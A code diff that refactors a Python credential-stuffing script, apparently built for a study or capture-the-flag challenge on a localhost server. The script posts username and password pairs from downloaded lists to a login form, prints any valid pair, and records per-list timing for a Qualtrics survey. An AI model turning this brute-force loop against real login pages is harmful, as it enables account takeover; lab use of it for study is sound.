@@ -6,80 +6,85 @@ from bs4 import BeautifulSoup
 
 def load_credentials(url):
     response = requests.get(url)
-    credentials = []
-    for line in response.text.split('\n'):
-        if ':' in line:
-            username, password = line.strip().split(':')
-            credentials.append((username, password))
-    return credentials
+    return [line.strip().split(':', 1) for line in response.text.split('\n') if ':' in line]
 
 def extract_qualtrics_data(html_content):
-    """Extract Qualtrics data from the response HTML"""
     soup = BeautifulSoup(html_content, 'html.parser')
-    qualtrics_json = soup.find('pre', id='qualtrics-json')
-    if qualtrics_json:
+    if qualtrics_json := soup.find('pre', id='qualtrics-json'):
         try:
-            data = json.loads(qualtrics_json.text)
-            return data
+            return json.loads(qualtrics_json.text)
         except json.JSONDecodeError:
-            print("Error parsing Qualtrics data JSON")
+            print("Error parsing Qualtrics JSON")
     return None
+
+def process_credentials(creds_url, session, base_url):
+    """Returns: (success_status, qualtrics_data)"""
+    try:
+        credentials = load_credentials(creds_url)
+        pbar = tqdm(credentials, desc="Testing credentials")
+        
+        for username, password in pbar:
+            response = session.post(f'{base_url}/', 
+                data={'username': username, 'password': password})
+            
+            # Display server messages
+            soup = BeautifulSoup(response.text, 'html.parser')
+            for alert in soup.find_all('div', class_='alert'):
+                class_list = alert.get('class', [])
+                alert_type = 'Server' if 'alert-danger' in class_list or 'alert-success' in class_list else 'Warning'
+                tqdm.write(f"\n{alert_type}: {alert.text.strip()}")
+            
+            if "Login successful" in response.text:
+                pbar.close()
+                print("\n\033[92mValid credentials found!\033[0m")
+                print(f"\033[94mUsername: {username}\033[0m\n\033[94mPassword: {password}\033[0m")
+                return True, extract_qualtrics_data(response.text)
+                
+        return False, None
+    
+    except KeyboardInterrupt:
+        pbar.close()
+        raise
 
 def main():
     base_url = 'http://localhost:8087'
-    
-    # Choose which credential list to use
-    list_choice = input("Which credential list to use? (1 or 2): ")
-    creds_url = f'{base_url}/credentials{list_choice}.txt'
-    
-    print("\nLoading credentials...")
-    # Store the credentials we get from the server
-    stored_credentials = load_credentials(creds_url)
-    print(f"Loaded {len(stored_credentials)} credential pairs")
-    
-    # Create a session to maintain cookies
     session = requests.Session()
+    list_times = {'1': 0.0, '2': 0.0}
+    current_list = input("Initial credential list (1/2): ").strip()
     
-    # Setup progress bar
-    pbar = tqdm(stored_credentials, desc="Testing credentials")
-    tqdm.write("\n[REMINDER] You can press Ctrl+C at any time to interrupt and switch to the other list.")
-
-    try:
-        for username, password in pbar:
-            # Try to login with credentials from the stored list
-            response = session.post(f'{base_url}/', data={
-                'username': username,
-                'password': password
-            })
+    while True:
+        start_time = time.time()
+        
+        try:
+            creds_url = f'{base_url}/credentials{current_list}.txt'
+            success, qualtrics_data = process_credentials(creds_url, session, base_url)
             
-            # Extract server message
-            soup = BeautifulSoup(response.text, 'html.parser')
-            alerts = soup.find_all('div', class_='alert')
-            for alert in alerts:
-                if 'alert-danger' in alert.get('class', []) or 'alert-success' in alert.get('class', []):
-                    tqdm.write(f"\nServer: {alert.text.strip()}")
-                elif 'alert-warning' in alert.get('class', []):  # Also show delay warnings
-                    tqdm.write(f"\nWarning: {alert.text.strip()}")
+            # Update time for completed list
+            list_times[current_list] += time.time() - start_time
             
-            # Check if login was successful
-            if "Login successful" in response.text:
-                pbar.close()
-                print(f"\nSuccess! Found working credentials! But now that you got the flag they were blocked "
-                           f"from the server. ")
-                # Extract and display Qualtrics data
-                qualtrics_data = extract_qualtrics_data(response.text)
+            if success:
+                total_time = sum(list_times.values())
                 if qualtrics_data:
-                    print("\033[91mCopy the text bellow to Qualtrics to get compensation for this challenge.\033[0m")
+                    qualtrics_data["time_stats"] = {
+                        "list_1_time": list_times['1'],
+                        "list_2_time": list_times['2'],
+                        "total_time": total_time
+                    }
+                    print("\033[91m▼▼▼ Copy text below to Qualtrics ▼▼▼\033[0m")
                     print(json.dumps(qualtrics_data, indent=2))
-                    print("\033[91mCopy the text above to Qualtrics to get compensation for this challenge.\033[0m")
-                
+                    print("\033[91m▲▲▲ Copy text above to Qualtrics ▲▲▲\033[0m")
                 break
+                
+        except KeyboardInterrupt:
+            # Capture partial time before switching
+            list_times[current_list] += time.time() - start_time
+            print(f"\nList 1 time: {list_times['1']:.1f}s | List 2 time: {list_times['2']:.1f}s")
+            current_list = '2' if current_list == '1' else '1'
+            print(f"\nSwitched to List {current_list}")
+            continue
             
-            
-    except KeyboardInterrupt:
-        print("\nAttack interrupted by user")
-        print("You can restart the script and select the other credential list if you want to switch")
+        # Show progress after each full list attempt
+        print(f"\nList 1: {list_times['1']:.1f}s | List 2: {list_times['2']:.1f}s")
 
-    
 if __name__ == "__main__":
     main()
